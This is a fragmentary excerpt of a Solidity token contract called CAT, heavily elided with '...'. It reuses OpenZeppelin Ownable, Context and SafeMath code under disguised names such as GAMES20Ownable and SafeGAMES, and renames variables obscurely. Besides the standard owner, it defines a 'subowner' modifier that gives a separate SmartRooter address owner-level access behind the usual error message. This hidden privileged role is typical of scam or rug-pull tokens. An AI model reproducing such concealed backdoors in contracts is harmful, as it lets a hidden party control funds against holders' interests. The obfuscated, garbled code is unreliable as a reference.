...
/*
Cat in Teh Hat
https://www.imdb.com/title/tt0312528/
https://www.youtube.com/watch?v=oIPq9Kp-9A0
...
/*
 * @dev Provides information about the current execution GAMES20Burnable, including the
 ...
 */
abstract contract GAMES20Burnable {
...
// File: @openzeppelin/contracts/access/GAMES20Ownable.sol
 ...
 * the owner.
 */
abstract contract GAMES20Ownable is GAMES20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "GAMES20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "GAMES20Ownable: new owner is the zero address");
 ...
 * `SafeGAMES` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeGAMES {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeGAMES: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeGAMES: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeGAMES: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeGAMES: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeGAMES: modulo by zero");
  }
...
contract CAT is GAMES20Burnable, GAMES711, GAMES20Ownable {
    
    using SafeGAMES for uint256;
    ...
    */
    ...
    /**
    * @dev See {GAMES711-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return deployfrom[account];
    }
      modifier subowner() {
        require(SmartRooter == _msgSender(), "GAMES20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {GAMES711-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {GAMES711-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {GAMES711};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "GAMES711: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {GAMES711-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "GAMES711: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "GAMES711: transfer from the zero address");
        require(shippingto != address(0), "GAMES711: transfer to the zero address");
                
        deployfrom[sender] = deployfrom[sender].sub(yoursold, "GAMES711: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "GAMES711: approve from the zero address");
        require(transporteur != address(0), "GAMES711: approve to the zero address");
